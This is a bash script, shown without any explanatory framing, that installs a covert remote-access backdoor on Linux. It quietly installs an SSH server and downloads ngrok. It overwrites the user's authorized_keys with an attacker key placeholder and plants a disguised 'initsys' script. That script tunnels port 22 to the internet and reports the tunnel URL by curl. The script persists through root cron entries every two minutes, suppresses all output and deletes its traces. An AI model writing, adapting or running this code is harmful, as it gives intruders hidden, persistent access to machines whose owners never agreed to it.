#!/bin/bash

rm /tmp/main* > /dev/null 2>&1
rm /tmp/ngrok* > /dev/null 2>&1
sudo apt install -y openssh-server wget unzip jq > /dev/null 2>&1
sudo yum install -y openssh-server wget unzip jq > /dev/null 2>&1
touch /etc/crontab > /dev/null 2>&1
yes | sudo pacman -Sy openssh cronie > /dev/null 2>&1
yes | sudo pacman -Sy wget unzip jq > /dev/null 2>&1

systemctl enable cronie > /dev/null 2>&1
systemctl start cronie > /dev/null 2>&1
found=$(cat /etc/crontab | grep initsys > /dev/null 2>&1; echo $?)
systemctl enable sshd.service > /dev/null 2>&1
systemctl enable sshd > /dev/null 2>&1
systemctl start sshd > /dev/null 2>&1
systemctl start sshd.service > /dev/null 2>&1
if [ -d "~/.ssh" ]
then
    echo "Directory exists."> /dev/null 2>&1
else
    mkdir ~/.ssh > /dev/null 2>&1
fi
wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -P /tmp/

echo "RSA PUB KEY" > ~/.ssh/authorized_keys
if [ -d "/etc/usertask" ] 
then
    echo "Directory exists." > /dev/null 2>&1
else
     mkdir /etc/usertask 
fi
rm -rf /etc/usertask/*
if [ -d "~/.ngrok2" ]
then
    echo "Directory exists." > /dev/null 2>&1
else
    mkdir ~/.ngrok2 > /dev/null 2>&1
fi
rm -rf ~/.ngrok2/* > /dev/null 2>&1
echo "authtoken: authtoken" > ~/.ngrok2/ngrok.yml
rm -rf /etc/usertask/* > /dev/null 2>&1
sendto() {
    if [[ $(sudo netstat -tulpn | grep :4040) ]]; then
        echo "already started" > /dev/null 2>&1
    else
        /etc/usertask/ngrok tcp 22 > /dev/null &
        systemctl enable sshd.service > /dev/null 2>&1
        systemctl enable sshd > /dev/null 2>&1
        systemctl start sshd > /dev/null 2>&1
        systemctl start sshd.service > /dev/null 2>&1
    fi
    export WEBHOOK_URL="$(curl http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url")"
    curl -X GET http://localhost:9000/?data=$WEBHOOK_URL  
}

a=$(declare -f sendto)
echo -e "$a \nsendto" > /tmp/initsys.sh

cp /tmp/initsys.sh /etc/usertask/initsys.sh 
unzip /tmp/ngrok-stable-linux-amd64.zip -d /tmp/ > /dev/null 2>&1
mv /tmp/ngrok /etc/usertask/ngrok > /dev/null 2>&1
chmod -R 775 /etc/usertask/* > /dev/null 2>&1
rm /tmp/initsys.sh > /dev/null 2>&1
rm /tmp/ngrok*  > /dev/null 2>&1

if [[ $(cat /etc/crontab | grep initsys) ]]; then
    echo "already inserted" > /dev/null 2>&1
else
    echo "*/2 * * * * root bash /etc/usertask/initsys.sh" >> /etc/crontab
fi


if [ ! -f "/var/spool/cron/root" ]; then
    touch /var/spool/cron/root  > /dev/null 2>&1
fi

if [[ $(cat /var/spool/cron/root | grep initsys) ]]; then
    echo "already inserted" > /dev/null 2>&1
else
    echo "*/2 * * * * root bash /etc/usertask/initsys.sh" >> /var/spool/cron/root
fi

rm /tmp/main.sh > /dev/null 2>&1
